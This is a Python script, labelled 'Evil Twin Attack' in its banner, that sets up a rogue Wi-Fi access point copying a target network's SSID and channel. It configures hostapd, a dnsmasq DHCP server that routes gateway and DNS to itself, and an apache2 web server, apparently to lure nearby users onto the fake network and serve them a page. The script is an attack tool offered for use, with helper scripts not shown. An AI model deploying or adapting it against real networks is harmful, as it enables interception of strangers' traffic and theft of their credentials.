#!/usr/bin/python

import utils 
import time
import sys

from argparse import ArgumentParser

def set_configs():

    parser = ArgumentParser()

    parser.add_argument('-u',
                dest='upstream',
                required=True,
                type=str,
                metavar='<upstream interface>',
                help='Use this interface as access point.')

    parser.add_argument('-s',
                dest='ssid',
                required=True,
                type=str,
                metavar='<ssid>',
                help='The ssid of the target ap.')

    parser.add_argument('-c',
                dest='channel',
                required=True,
                type=int,
                metavar='<channel>',
                help='The channel of the target ap.')

    args = parser.parse_args()
    
    return {
        'upstream' : args.upstream,
        'ssid' : args.ssid,
        'channel' : args.channel,
    }

def display_configs(configs):

    print
    print ('[+] Access Point interface:', configs['upstream'])
    print ('[+] Target AP Name:', configs['ssid'])
    print ('[+] Target AP Channel:', configs['channel'])
    print

def kill_daemons():

    print ('[*] Killing existing dnsmasq and hostapd processes.')
    print 

    utils.bash_command('killall dnsmasq')
    utils.bash_command('killall hostapd')
    utils.bash_command('killall apache2')

    print
    print ('[*] Continuing...')

def main():

    print(r"""
            
            ( )
             H
             H
            _H_  
        .-'-.-'-.
        /         |
        |           |
        |   .-------'._
        |  / /  '.' '. |
        |  \ \ @   @ / / 
        |   '---------'      .-------------------------.  
        |    _______|       (     Evil Twin Attack       )
        |  .'-+-+-+|        ( Elmalem Lioz && Caspi Gal  ) 
        |  '.-+-+-+|         '-------------------------'
        |    '''''' |
        '-.__   __.-'
            '''
               
            """)

    configs = set_configs()
    display_configs(configs)
    kill_daemons()

    hostapd = utils.HostAPD.get_instance()
    dnsmasq = utils.DNSMasq.get_instance()
    apache2 = utils.APACHE2.get_instance()

    # configure dnsmasq
    print ('[*] Configuring dnsmasq')
    dnsmasq.configure(configs['upstream'],
                    '10.0.0.0,10.0.0.250,12h',
                    dhcp_options=[ '3,10.0.0.1', '6,10.0.0.1' ])

    # configure hostpad
    print ('[*] Configuring hostapd')
    hostapd.configure(configs['upstream'],
                    configs['ssid'],
                    configs['channel'])

    try:

        utils.bash_command('bash start.sh %s' % configs['upstream'])

    except KeyboardInterrupt:

        print ('\n\n[*] Exiting on user command.')
        
    print ('[*] Stopping dnsmasq.')
    dnsmasq.stop()
    print ('[*] Stopping hostapd.')
    hostapd.stop()
    print ('[*] Stopping apache2.')
    apache2.stop()

    utils.bash_command('bash reset.sh')

if __name__ == '__main__':
    main()